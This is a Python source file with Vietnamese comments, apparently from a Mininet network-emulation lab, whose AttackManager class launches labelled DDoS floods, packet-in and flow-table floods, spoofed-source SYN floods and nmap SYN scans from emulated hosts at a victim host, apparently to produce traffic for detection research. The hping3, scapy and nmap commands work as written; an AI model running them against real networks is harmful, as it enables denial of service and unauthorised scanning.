import random
import os

# Tính toán đường dẫn tuyệt đối tới thư mục gốc (lùi ra 1 cấp từ traffic_generator)
PROJECT_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), '..'))
SIGNAL_FILE = os.path.join(PROJECT_ROOT, "logs", "current_attack.txt")

class AttackManager:
    def __init__(self, net):
        self.net = net
        self.attackers = [net.get(f'h{i}') for i in range(1, 7)]
        self.victim = net.get('h8')
        self.active_pids = []
        
        # Đảm bảo thư mục logs ở gốc tồn tại
        os.makedirs(os.path.dirname(SIGNAL_FILE), exist_ok=True)
        self._set_state("Normal Traffic")

    def _set_state(self, state_name):
        """Ghi trạng thái tấn công ra file tín hiệu ở thư mục gốc"""
        try:
            # Ghi đè trạng thái
            with open(SIGNAL_FILE, "w") as f:
                f.write(state_name)
        except Exception as e:
            print(f"[!] Lỗi ghi file trạng thái: {e}")

    # ================================
    # CÁC KỊCH BẢN TẤN CÔNG
    # ================================
    def ddos_flood(self):
        self._set_state("DDoS Flood")
        print(f"[*] INTENSE DDoS: {len(self.attackers)} hosts -> {self.victim.IP()}")
        for attacker in self.attackers:
            for _ in range(10):
                cmd = (f'hping3 --flood --rand-source -p {random.randint(1,65535)} {self.victim.IP()} --fast > /dev/null 2>&1 & echo $!')
                pid = attacker.cmd(cmd).strip()
                self.active_pids.append((attacker, pid))

    def packet_in_flood(self):
        self._set_state("Packet-In Flood")
        attacker = random.choice(self.attackers)
        print(f"[*] INTENSE Packet-In Flood từ {attacker.name}")
        for _ in range(10):
            cmd = (f'python3 -c "from scapy.all import *; send(IP(dst=\\"{self.victim.IP()}\\")/TCP(sport=RandShort(), dport=RandShort()), loop=1, inter=0, verbose=0)" > /dev/null 2>&1 & echo $!')
            pid = attacker.cmd(cmd).strip()
            self.active_pids.append((attacker, pid))

    def flow_overflow(self):
        self._set_state("Flow Table Overflow")
        attacker = random.choice(self.attackers)
        print(f"[*] INTENSE Flow Overflow từ {attacker.name}")
        for _ in range(20):
            cmd = (f'hping3 --flood --rand-source -S -p {random.randint(1,65535)} {self.victim.IP()} --fast > /dev/null 2>&1 & echo $!')
            pid = attacker.cmd(cmd).strip()
            self.active_pids.append((attacker, pid))

    def ip_spoofing(self):
        self._set_state("IP Spoofing")
        attacker = random.choice(self.attackers)
        print(f"[*] INTENSE IP Spoofing từ {attacker.name}")
        for _ in range(15):
            fake_ip = f"10.0.0.{random.randint(100,250)}"
            cmd = (f'hping3 --flood --rand-source -S -a {fake_ip} -p {random.randint(1,65535)} {self.victim.IP()} --fast > /dev/null 2>&1 & echo $!')
            pid = attacker.cmd(cmd).strip()
            self.active_pids.append((attacker, pid))

    def port_scanning(self):
        self._set_state("Port Scanning")
        attacker = random.choice(self.attackers)
        print(f"[*] INTENSE Port Scanning từ {attacker.name}")
        for _ in range(5):
            cmd = (f'nmap -sS -p 1-65535 -T5 --max-retries 1 {self.victim.IP()} > /dev/null 2>&1 & echo $!')
            pid = attacker.cmd(cmd).strip()
            self.active_pids.append((attacker, pid))

    def stop_all(self):
        self._set_state("Normal Traffic")
        print("[*] Stopping all attacks...")
        for attacker, pid in self.active_pids:
            try:
                attacker.cmd(f'kill -9 {pid}')
            except:
                pass
        for host in self.attackers:
            host.cmd('pkill -9 hping3 nmap python3')
        self.active_pids.clear()
        print("[+] Attack stopped.")